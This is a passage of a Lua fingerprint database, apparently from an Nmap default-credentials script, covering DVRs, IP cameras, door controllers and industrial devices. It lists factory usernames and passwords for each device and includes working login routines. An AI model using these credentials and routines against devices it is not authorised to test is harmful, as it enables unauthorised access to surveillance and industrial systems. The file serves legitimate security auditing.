                 and get_refresh_url(resp.body or "", "/cgi%-bin/%w+%.cgi%?%w+%.html$")
    if not lurl then return false end
    return try_http_auth(host, port, lurl, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "JVC VR-8xx DVR",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return http_auth_realm(response) == "VR-8xx"
  end,
  login_combos = {
    {username = "admin", password = "jvc"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "JVC Broadcaster",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return (http_auth_realm(response) or ""):find("^JVC Broadcaster %d+%.%d+")
  end,
  login_combos = {
    {username = "admin", password = "jvc1234"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "OEM DVR",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("%Wdocument%.location%.replace%(%s*(['\"])mlogin%.cgi%1%s*%)%s*;")
           and response.body:lower():find("<title>dvr login</title>", 1, true)
  end,
  login_combos = {
    {username = "admin", password = ""}
  },
  login_check = function (host, port, path, user, pass)
    local form = {c_userid=user,
                  c_password=pass,
                  c_target=2}
    local resp = http_post_simple(host, port,
                                 url.absolute(path, "direct_open_setup.cgi"),
                                 nil, form)
    return resp.status == 200
           and get_tag(resp.body or "", "script", {src="^setup%.js$"})
  end
})

table.insert(fingerprints, {
  name = "Samsung DVR",
  cpe = "cpe:/h:samsung:dvr",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return have_openssl
           and response.status == 200
           and response.body
           and response.body:find("Samsung", 1, true)
           and response.body:lower():find("<title>web viewer for samsung dvr</title>", 1, true)
  end,
  login_combos = {
    {username = "admin", password = "4321"}
  },
  login_check = function (host, port, path, user, pass)
    local cookie = ("DATA1=%s&DATA2=%s&SDATA3=%.15f"):format(base64.enc(user),
                                                             base64.enc(pass),
                                                             math.random())
    local form = {lang="en",
                  port=0,
                  close_user_session=0,
                  data1=base64.enc(user),
                  data2=stdnse.tohex(openssl.md5(pass))}
    local resp = http_post_simple(host, port,
                                 url.absolute(path, "cgi-bin/webviewer_cgi_login2"),
                                 {cookies=cookie}, form)
    return resp.status == 200
           and (resp.body or ""):find("%Wtop%.document%.location%.href%s*=%s*['\"]%.%./index%.htm[?'\"]")
  end
})

table.insert(fingerprints, {
  name = "Samsung iPOLiS",
  cpe = "cpe:/a:samsung:ipolis_device_manager",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    if not (response.status == 200
           and response.body
           and response.body:find("home/monitoring.cgi", 1, true)
           and response.body:find("%Wdocument%.location%.replace%((['\"])[^'\"]-%f[^/'\"]home/monitoring%.cgi%1%)%s*;")) then
      return false
    end
    local resp = http_get_simple(host, port,
                                url.absolute(path, "home/monitoring.cgi"))
    return (http_auth_realm(resp) or ""):find("^iPolis%f[_\0]")
  end,
  login_combos = {
    {username = "admin", password = "4321"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, url.absolute(path, "home/monitoring.cgi"),
                        user, pass, true)
  end
})

table.insert(fingerprints, {
  name = "Truen TCAM (var.1)",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("/user/view.html", 1, true)
           and get_tag(response.body, "frame", {src="/user/view%.html$"})
           and response.body:lower():find("<title>video surveillance</title>", 1, true)
  end,
  login_combos = {
    {username = "admin", password = "1234"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, url.absolute(path, "user/view.html"),
                        user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Truen TCAM (var.2)",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    local lurl = response.status == 200
                 and get_refresh_url(response.body or "", "/user/view%.html$")
    if not lurl then return false end
    local resp = http_get_simple(host, port, lurl)
    return (http_auth_realm(resp) or ""):find("^IPVideo_%x+$")
  end,
  login_combos = {
    {username = "admin", password = "1234"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, url.absolute(path, "user/view.html"),
                        user, pass, "any")
  end
})

table.insert(fingerprints, {
  name = "TVT DVR",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    if not (response.status == 200
           and response.body
           and response.body:find("Pages/login.htm", 1, true)
           and response.body:find("%Wwindow%.location%.href%s*=%s*(['\"])Pages/login%.htm%1")) then
      return false
    end
    local resp = http_get_simple(host, port,
                                url.absolute(path, "Pages/login.htm"))
    return resp.status == 200
           and resp.body
           and resp.body:find("IDCS_LOGIN_NBSP", 1, true)
  end,
  login_combos = {
    {username = "admin", password = "123456"},
    {username = "admin", password = "1"}
  },
  login_check = function (host, port, path, user, pass)
    local auth = {username = user, password = pass}
    local header = {["Content-Type"]="text/plain;charset=UTF-8"}
    local msg = [=[
      <?xml version="1.0" encoding="utf-8" ?>
      <request version="1.0" systemType="NVMS-9000" clientType="WEB"/>
      ]=]
    msg = msg:gsub("^%s+", ""):gsub("\n%s*", "")
    local resp = http_post_simple(host, port, url.absolute(path, "doLogin"),
                                 {auth=auth, header=header}, msg)
    return resp.status == 200
           and (resp.body or ""):find("<status>success</status>", 1, true)
  end
})

table.insert(fingerprints, {
  name = "Ubiquiti UniFi Video (var.1)",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find(">UniFi Video<", 1, true)
           and response.body:lower():find("<title>unifi video</title>", 1, true)
           and get_tag(response.body, "main-view", {["ui-view"]=""})
           and get_tag(response.body, "script", {["data-headjs-load"]="^main%.js%f[\0?]"})
  end,
  login_combos = {
    {username = "ubnt", password = "ubnt"}
  },
  login_check = function (host, port, path, user, pass)
    local header = {["Referer"]=url.build(url_build_defaults(host, port, {path=url.absolute(path, "login")})),
                    ["Content-Type"]="application/json",
                    ["Accept"]="application/json, text/plain, */*"}
    local jin = {username=user, password=pass}
    json.make_object(jin)
    local resp = http_post_simple(host, port,
                                 url.absolute(path, "api/1.1/login"),
                                 {cookies="ubntActiveUser=false", header=header},
                                 json.generate(jin))
    return resp.status == 200
           and get_cookie(resp, "authId", "^%w+$")
  end
})

table.insert(fingerprints, {
  name = "Ubiquiti UniFi Video (var.2)",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find(">UniFi Video<", 1, true)
           and response.body:find("app-id=com.ubnt.unifivideo", 1, true)
           and response.body:lower():find("<title>unifi video</title>", 1, true)
           and get_tag(response.body, "meta", {name="^google%-play%-app$", content="^app%-id=com%.ubnt%.unifivideo$"})
  end,
  login_combos = {
    {username = "ubnt", password = "ubnt"}
  },
  login_check = function (host, port, path, user, pass)
    local resp1 = http_get_simple(host, port, path)
    if resp1.status ~= 200 then return false end
    local header = {["Referer"]=url.build(url_build_defaults(host, port, {path=url.absolute(path, "login")})),
                    ["Content-Type"]="application/json",
                    ["Accept"]="application/json, text/plain, */*"}
    local jin = {username=user, password=pass}
    json.make_object(jin)
    local resp2 = http_post_simple(host, port,
                                  url.absolute(path, "api/2.0/login"),
                                  {cookies=resp1.cookies, header=header},
                                  json.generate(jin))
    return resp2.status == 200
           and get_cookie(resp2, "JSESSIONID_AV", "^%x+$")
  end
})

table.insert(fingerprints, {
  name = "Xiongmai NETSurveillance",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("%Wlocation%s*=%s*(['\"])Login%.htm%1%s*;")
           and response.body:find("%Wvar%s+gHashCookie%s*=%s*new%s+Hash%.Cookie%(%s*(['\"])NetSuveillanceWebCookie%1%s*,")
  end,
  login_combos = {
    {username = "admin",   password = ""},
    {username = "default", password = "tluafed"}
  },
  login_check = function (host, port, path, user, pass)
    local cookie = "NetSuveillanceWebCookie="
                   .. url.escape(('{"username":"%s"}'):format(user))
    local form = stdnse.output_table()
    form.command = "login"
    form.username = user
    form.password = pass
    local resp = http_post_simple(host, port, url.absolute(path, "Login.htm"),
                                 {cookies=cookie}, form)
    return resp.status == 200
           and (resp.body or ""):match("%Wvar%s+g_user%s*=%s*['\"](.-)['\"]%s*;") == user
  end
})

table.insert(fingerprints, {
  name = "AVTech AVC DVR",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("MM_goToURL", 1, true)
           and response.body:lower():find("<title>--- video web server ---</title>", 1, true)
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {username=user,
                  password=pass,
                  Submit="Submit"}
    local resp = http_post_simple(host, port, url.absolute(path, "home.htm"),
                                 nil, form)
    return resp.status == 200
           and (resp.body or ""):lower():find("<object%s")
  end
})

table.insert(fingerprints, {
  name = "AVTech IP Camera",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("/nobody/", 1, true)
           and response.body:lower():find("<title>::: login :::</title>", 1, true)
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local creds = base64.enc(user .. ":" .. pass)
    local lurl = ("cgi-bin/nobody/VerifyCode.cgi?account=%s&rnd=%.15f"):format(
                 creds, math.random())
    local resp = http_get_simple(host, port, url.absolute(path, lurl))
    return resp.status == 200
           and get_cookie(resp, "SSID") == creds
  end
})

table.insert(fingerprints, {
  name = "EverFocus ECORHD",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    local realm = http_auth_realm(response) or ""
    return realm:find("^ECOR%d+%-[%u%d]+$")
           or realm:find("^ELUX%d+$")
  end,
  login_combos = {
    {username = "admin", password = "11111111"},
    {username = "user1", password = "11111111"},
    {username = "user2", password = "11111111"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, true)
  end
})

table.insert(fingerprints, {
  name = "Interlogix truVision",
  category = "security",
  paths = {
    {path = "/index.asp"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.header["server"] == "Interlogix-Webs"
           and response.body
           and response.body:find("%Wwindow%.location%.href%s*=%s*(['\"])doc/page/login%.asp%1")
  end,
  login_combos = {
    {username = "admin", password = "1234"}
  },
  login_check = function (host, port, path, user, pass)
    local header = {["Content-Type"]="text/xml"}
    local creds = {username = user, password = pass, digest = false}
    local ipaddr = ("192.168.%d.%d"):format(math.random(254), math.random(254))
    local macaddr = random_hex(12):gsub("..", ":%1"):sub(2)
    local msg = [[
      <?xml version="1.0" encoding="utf-8"?>
      <userCheck>
        <ipAddress>__IPADDR__</ipAddress>
        <macAddress>__MACADDR__</macAddress>
      </userCheck>]]
    msg = msg:gsub("^%s+", ""):gsub("\n%s*", "")
    msg = msg:gsub("__%w+__", {__IPADDR__=ipaddr, __MACADDR__=macaddr})
    local resp = http_post_simple(host, port,
                                 url.absolute(path, "PSIA/Custom/SelfExt/userCheckEx"),
                                 {header=header, auth=creds}, msg)
    return resp.status == 200
           and (resp.body or ""):find("<statusValue>200</statusValue>", 1, true)
  end
})

table.insert(fingerprints, {
  name = "LILIN NVR",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return (http_auth_realm(response) or ""):find("^Merit LILIN")
  end,
  login_combos = {
    {username = "admin", password = "1111"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "NUUO NVR",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("NUUO", 1, true)
           and response.body:lower():find("<title>nuuo network video recorder login</title>", 1, true)
           and get_tag(response.body, "form", {name="^mainform$", action="^index%.php$"})
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {language="English",
                  login=user,
                  password=pass,
                  submit=" Login "}
    local resp = http_post_simple(host, port, url.absolute(path, "index.php"),
                                 nil, form)
    return resp.status == 302
           and resp.header["location"] == "screen.php"
  end
})

table.insert(fingerprints, {
  name = "NUUO Titan NVR",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("NUUO", 1, true)
           and response.body:lower():find("<title>[%w%s]*network video recorder login</title>")
           and get_tag(response.body, "form", {name="^mainform$", action="^login%.php$"})
           and get_tag(response.body, "img", {type="^submit$", value="^login$"})
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {language="en",
                  user=user,
                  pass=pass,
                  browser_engine="firefox"}
    local resp = http_post_simple(host, port, url.absolute(path, "login.php"),
                                 nil, form)
    return (resp.status == 302
             and (resp.header["location"] or ""):find("/setting%.php$"))
           or (resp.status == 200
             and (resp.body or ""):find("%snexpage%s*=%s*(['\"])setting%.php%1"))
  end
})

table.insert(fingerprints, {
  name = "NUUO Solo NVR",
  cpe = "cpe:/o:nuuo:nvrsolo",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("NUUO", 1, true)
           and response.body:lower():find("<title>[%w%s]*network video recorder login</title>")
           and get_tag(response.body, "form", {name="^mainform$", action="^login%.php$"})
           and get_tag(response.body, "input", {type="^submit$", name="^submit$"})
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {language="en",
                  user=user,
                  pass=pass,
                  submit="Login"}
    local resp = http_post_simple(host, port, url.absolute(path, "login.php"),
                                 nil, form)
    return (resp.status == 302
             and (resp.header["location"] or ""):find("/setting%.php$"))
           or (resp.status == 200
             and (resp.body or ""):find("%snexpage%s*=%s*(['\"])setting%.php%1"))
  end
})

table.insert(fingerprints, {
  name = "NUUO Solo NVR OEM",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("NUUO", 1, true)
           and response.body:lower():find("<title>[%w%s]*network video recorder login</title>")
           and get_tag(response.body, "form", {name="^mainform$", action="^login%.php$"})
           and get_tag(response.body, "input", {type="^image$", name="^submit$"})
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {["submit.x"]=0,
                  ["submit.y"]=0,
                  language="en",
                  user=user,
                  pass=pass,
                  browser_engine="firefox",
                  base_url=""}
    local resp = http_post_simple(host, port, url.absolute(path, "login.php"),
                                 nil, form)
    return (resp.status == 302
             and (resp.header["location"] or ""):find("/setting%.php$"))
           or (resp.status == 200
             and (resp.body or ""):find("%snexpage%s*=%s*(['\"])setting%.php%1"))
  end
})

table.insert(fingerprints, {
  name = "VideoIQ iCVR",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 302
           and (response.header["location"] or ""):find("?wicket:bookmarkablePage=:com.videoiq.fusion.camerawebapi.ui.pages.LoginPage", 1, true)
  end,
  login_combos = {
    {username = "supervisor", password = "supervisor"}
  },
  login_check = function (host, port, path, user, pass)
    local resp1 = http_get_simple(host, port, path)
    local lurl = (resp1.header["location"] or ""):match("%f[/]/%f[^/].*")
    if not (resp1.status == 302 and lurl) then return false end
    local form = {loginForm1_hf_0="",
                  userName=user,
                  password=pass,
                  login=""}
    local resp2 = http_post_simple(host, port,
                                  lurl .. "&wicket:interface=:0:loginPanel:loginForm::IFormSubmitListener::",
                                  {cookies=resp1.cookies}, form)
    return resp2.status == 302
  end
})

table.insert(fingerprints, {
  name = "Dahua Security",
  cpe = "cpe:/o:dahuasecurity:dvr_firmware",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return have_openssl
           and response.status == 200
           and response.body
           and (response.body:find("js/loginEx.js", 1, true)
               and get_tag(response.body, "script", {src="^js/loginEx%.js%f[?\0]"})
               and get_tag(response.body, "script", {src="^jsCore/rpcCore%.js%f[?\0]"})
             or response.body:find("/js/merge.js", 1, true)
               and get_tag(response.body, "script", {src="/js/merge%.js$"})
               and get_tag(response.body, "div", {id="^download_plugins$"})
             or response.body:find("jsBase/widget/js/dui.tab.js", 1, true)
               and get_tag(response.body, "script", {src="^jsBase/widget/js/dui%.tab%.js%f[?\0]"})
               and get_tag(response.body, "script", {src="^jsCore/common%.js%f[?\0]"}))
  end,
  login_combos = {
    {username = "666666",    password = "666666"},
    {username = "admin",     password = "admin"},
    {username = "anonymity", password = "anonymity"}
  },
  login_check = function (host, port, path, user, pass)
    local lurl = url.absolute(path, "RPC2_Login")
    local opts = {cookies="DHLangCookie30=English",
                  header={["X-Request"]="JSON"}}
    local jin = {method="global.login",
                 params={userName=user,
                         password="",
                         clientType="Web3.0"},
                 id=10000}
    json.make_object(jin)
    local resp1 = http_post_simple(host, port, lurl, opts, json.generate(jin))
    if not (resp1.status == 200 and resp1.body) then return false end
    local jstatus, jout = json.parse(resp1.body)
    local params = jstatus and jout.params
    if not params then return false end
    local passtype
    if not params.encryption then
    elseif params.encryption == "Basic" then
      pass = base64.enc(user .. ":" .. pass)
    elseif params.encryption == "Default" then
      local hashfnc = function (...)
                        local text = table.concat({...}, ":")
                        return stdnse.tohex(openssl.md5(text)):upper()
                      end
      if not (params.random and params.realm) then return false end
      pass = hashfnc(user, params.random, hashfnc(user, params.realm, pass))
      passtype = "Default"
    elseif params.encryption == "OldDigest" then
      local hash = openssl.md5(pass)
      local ptbl = {}
      for i = 1, #hash, 2 do
        local a, b = hash:byte(i, i + 1)
        a = (a + b) % 62
        if a <= 9 then
          b = 48
        elseif a <= 35 then
          b = 55
        else
          b = 61
        end
        table.insert(ptbl, string.char(a + b))
      end
      pass = table.concat(ptbl)
    else
      return false
    end
    opts.cookies = opts.cookies .. ";  DhWebClientSessionID=" .. jout.session
    jin.session = jout.session
    jin.params.password = pass
    jin.params.passwordType = passtype
    jin.params.authorityType = params.encryption
    local resp2 = http_post_simple(host, port, lurl, opts, json.generate(jin))
    if not (resp2.status == 200 and resp2.body) then return false end
    jstatus, jout = json.parse(resp2.body)
    return jstatus and jout.result
  end
})

table.insert(fingerprints, {
  name = "Digital Watchdog",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return have_openssl
           and response.status == 301
           and (response.header["location"] or ""):find("/static/index%.html$")
           and (response.header["server"] or ""):find("(Digital Watchdog)", 1, true)
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local lurl = url.absolute(path, "api/getCurrentUser")
    local resp1 = http_get_simple(host, port, lurl, {cookies="Authorization=Digest"})
    local realm = get_cookie(resp1, "realm")
    local nonce = get_cookie(resp1, "nonce")
    if not (resp1.status == 401 and realm and nonce) then return false end
    user = user:lower()
    local hashfnc = function (...)
                      local text = table.concat({...}, ":")
                      return stdnse.tohex(openssl.md5(text))
                    end
    local hash = hashfnc(hashfnc(user, realm, pass), nonce, hashfnc("GET:"))
    local auth = url.escape(base64.enc(table.concat({user, nonce, hash}, ":")))
    table.insert(resp1.cookies, {name="Authorization", value="Digest", path=path})
    table.insert(resp1.cookies, {name="auth", value=auth, path=path})
    local resp2 = http_get_simple(host, port, lurl, {cookies=resp1.cookies})
    return resp2.status == 200
           and resp2.header["content-type"] == "application/json"
  end
})

table.insert(fingerprints, {
  name = "Loxone Intercom Video",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and (response.header["server"] or ""):find("HyNetOS/%d+%.")
           and response.body
           and response.body:find("Loxone", 1, true)
           and response.body:lower():find("<title>loxone intercom video</title>", 1, true)
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, url.absolute(path, "setup.cgi"),
                        user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Loxone Smart Home",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return have_openssl
           and response.status == 200
           and response.body
           and response.body:find("Loxone", 1, true)
           and response.body:lower():find("<title>loxone smart home</title>", 1, true)
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local resp1 = http_get_simple(host, port,
                                 url.absolute(path, "jdev/cfg/apiKey"))
    if not (resp1.status == 200 and resp1.body) then return false end
    local jstatus, jout = json.parse(resp1.body)
    if not (jstatus and jout.LL.value) then return false end
    jstatus, jout = json.parse(jout.LL.value:gsub("'", '"'))
    if not (jstatus and jout.key) then return false end
    local key = stdnse.fromhex(jout.key)
    local auth = stdnse.tohex(openssl.hmac("SHA1", key, user .. ":" .. pass))
    local lurl = "jdev/sps/LoxAPPversion3?" .. url.build_query({auth=auth,user=user})
    local resp2 = http_get_simple(host, port, url.absolute(path, lurl))
    return resp2.status == 200
  end
})

table.insert(fingerprints, {
  name = "Automa Lilliput2",
  category = "security",
  paths = {
    {path = "/login.php"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("Automa", 1, true)
           and response.body:lower():find("<title>[^<]-%sautoma srl</title>")
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local resp = http_post_simple(host, port, path, nil,
                                 {username=user,password=pass,submit="Login"})
    return resp.status == 302
           and resp.header["location"] == "index.php"
  end
})

table.insert(fingerprints, {
  name = "Siedle Door Controller",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.header["server"] == "Z-World Rabbit"
           and response.body
           and response.body:lower():find("<title></title>", 1, true)
           and response.body:lower():find("%Wparent%.location%s*=%s*(['\"])[^'\"]-/index%.zht%1")
  end,
  login_combos = {
    {username = "Service", password = "Siedle"}
  },
  login_check = function (host, port, path, user, pass)
    local resp1 = http_get_simple(host, port, url.absolute(path, "login.zht"))
    if not (resp1.status == 200 and resp1.body) then return false end
    local lang = resp1.body:lower():match("<select%f[%s][^>]-%sname%s*=%s*['\"]m_webdata%.m_cgilogin%.m_lang['\"].-<option%f[%s]([^>]-%sselected%f[%s>][^>]*)")
    lang = (lang or ""):match("%svalue%s*=%s*['\"](%w+)['\"]")
    if not lang then return false end
    local form2 = stdnse.output_table()
    form2["m_webdata.m_cgiLogin.m_user"] = user
    form2["m_webdata.m_cgiLogin.m_passwd"] = pass
    form2["m_webdata.m_cgiLogin.m_lang"] = lang
    form2["action.x"] = 0
    form2["action.y"] = 0
    local resp2 = http_post_simple(host, port, url.absolute(path, "login.cgi"),
                                  nil, form2)
    return resp2.status == 302
           and (resp2.header["location"] or ""):find("/index%.zht$")
           and get_cookie(resp2, "DCRABBIT", "^%-?%d+$")
  end
})

table.insert(fingerprints, {
  name = "Genetec Synergis",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    if not (response.status == 200
            and response.header["server"] == "Microsoft-HTTPAPI/2.0"
            and response.body
            and get_refresh_url(response.body, "/ui$")) then
      return false
    end
    local resp = http_get_simple(host, port,
                                url.absolute(path, "ui/LogOn?ReturnUrl=%2fui"))
    return resp.status == 200
           and resp.body
           and resp.body:find("/genetec.")
  end,
  login_combos = {
    {username = "admin", password = "softwire"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {UserName=user,
                  Password=pass,
                  Language="En",
                  TimeZoneOffset=0}
    local resp = http_post_simple(host, port,
                                 url.absolute(path, "ui/LogOn?ReturnUrl=%2fui"),
                                 nil, form)
    return resp.status == 302
           and (resp.header["location"] or ""):find("/ui$")
  end
})

---
--Industrial systems
---
table.insert(fingerprints, {
  name = "Schneider Modicon Web",
  category = "industrial",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 302
           and (response.header["server"] or ""):find("^Schneider%-WEB/V%d+%.")
           and (response.header["location"] or ""):find("/index%.htm$")
  end,
  login_combos = {
    {username = "USER", password = "USER"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port,
                        url.absolute(path, "secure/embedded/http_passwd_config.htm?Language=English"),
                        user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Schneider Xflow",
  category = "industrial",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return have_openssl
           and response.status == 200
           and response.body
           and response.body:find("Xflow", 1, true)
           and get_tag(response.body, "input", {name="^rsakey1$"})
  end,
  login_combos = {
    {username = "TEST", password = "TEST"}
  },
  login_check = function (host, port, path, user, pass)
    local resp1 = http_get_simple(host, port, path)
    if not (resp1.status == 200 and resp1.body) then return false end
    local rsakey1 = get_tag(resp1.body, "input", {name="^rsakey1$", value="^%d+$"})
    local rsakey2 = get_tag(resp1.body, "input", {name="^rsakey2$", value="^%d+$"})
    if not (rsakey1 and rsakey2) then return false end
    local p = openssl.bignum_dec2bn(rsakey1.value)
    local m = openssl.bignum_dec2bn(rsakey2.value)
    local encpass = {}
    local r = 0
    for _, s in ipairs({pass:byte(1, -1)}) do
      local a = openssl.bignum_dec2bn(r + s)
      local b = openssl.bignum_bn2dec(openssl.bignum_mod_exp(a, p, m))
      table.insert(encpass, ("%04x"):format(b))
      r = s
    end
    table.insert(encpass, 1, ("0000"):rep(16-#encpass))
    local form2 = {language="EN",
                   login="home.xml",
                   username=user,
                   rsakey1=rsakey1.value,
                   rsakey2=rsakey2.value,
                   pwd=table.concat(encpass):upper(),
                   enter="Log in"}
    local resp2 = http_post_simple(host, port, url.absolute(path, "kw"),
                                  nil, form2)
    return resp2.status == 200
           and (resp2.body or ""):find("%Wvar%s+sessionid%s*=%s*(['\"])%x+%1")
  end
})

table.insert(fingerprints, {
  name = "TCS Basys Controls Communication Center",
  category = "industrial",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return http_auth_realm(response) == "Private"
  end,
  login_combos = {
    {username = "admin", password = "password"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Adcon Telemetry Gateway",
  category = "industrial",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("Adcon", 1, true)
           and response.body:lower():find("<title>%s*adcon telemetry gateway%s*</title>")
           and get_tag(response.body, "a", {href="%f[%w]configurator%.jnlp$"})
  end,
  login_combos = {
    {username = "root", password = "840sw"},
    {username = "adv",  password = "addvantage"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, url.absolute(path, "getconfig"),
                        user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Lantronix ThinWeb Manager",
  category = "industrial",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return have_openssl
           and response.status == 200
           and (response.header["server"] or ""):find("^Gordian Embedded")
           and response.body
           and response.body:find("Lantronix", 1, true)
           and response.body:lower():find("<title>lantronix %w*web manager%W")
  end,
  login_combos = {
    {username = "", password = "system"}
  },
  login_check = function (host, port, path, user, pass)
    local resp0 = http_get_simple(host, port, path)
    if not (resp0.status == 200 and resp0.body) then return false end
    local lurl = get_tag(resp0.body, "frame", {src="^summary%.html$"})
                   and "server.html"
                 or resp0.body:lower():match("<a%f[%s][^>]-%shref%s*=%s*['\"]([^'\"]+)['\"]%s*>server properties</a>")
    if not lurl then return false end
    lurl = url.absolute(path, lurl)
    local resp1 = http_get_simple(host, port, lurl)
    local nonce = resp1.status == 403 and get_cookie(resp1, "SrvrNonce", ".")
    if not nonce then return false end
    local creds = stdnse.tohex(openssl.md5(nonce .. ":" .. pass:upper()))
    local cookies = ("SrvrNonce=%s; SrvrCreds=%s"):format(nonce, creds)
    local resp2 = http_get_simple(host, port, lurl, {cookies=cookies})
    return resp2.status == 200
  end
})

table.insert(fingerprints, {
  name = "Lantronix XPort",
  category = "industrial",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("secure/ltx_conf.htm", 1, true)
  end,
  login_combos = {
    {username = "",  password = ""}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, url.absolute(path, "secure/ltx_conf.htm"),
                        user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Moxa MiiNePort",
  cpe = "cpe:/o:moxa:miineport_*",
  category = "industrial",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return have_openssl
           and response.status == 307
           and (response.header["location"] or ""):find("/moxa/home%.htm$")
  end,
  login_combos = {
    {username = "admin", password = ""}
  },
  login_check = function (host, port, path, user, pass)
    local form = {Username=user,
                  Password="",
                  MD5Password=stdnse.tohex(openssl.md5(pass)),
                  Submit="Login"}
    local resp = http_post_simple(host, port,
                                 url.absolute(path, "moxa/Login.htm"),
                                 nil, form)
    return resp.status == 200
           and (resp.body or ""):find("%Wwindow%.open%((['\"])home%.htm%1")
  end
})

table.insert(fingerprints, {
  name = "MBus Webserver",
  category = "industrial",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return http_auth_realm(response) == "MBus Webserver"
           and response.header["server"] == "MBus WebServer"
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Silex Server (var.1)",
  cpe = "cpe:/o:silex:*",
  category = "industrial",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
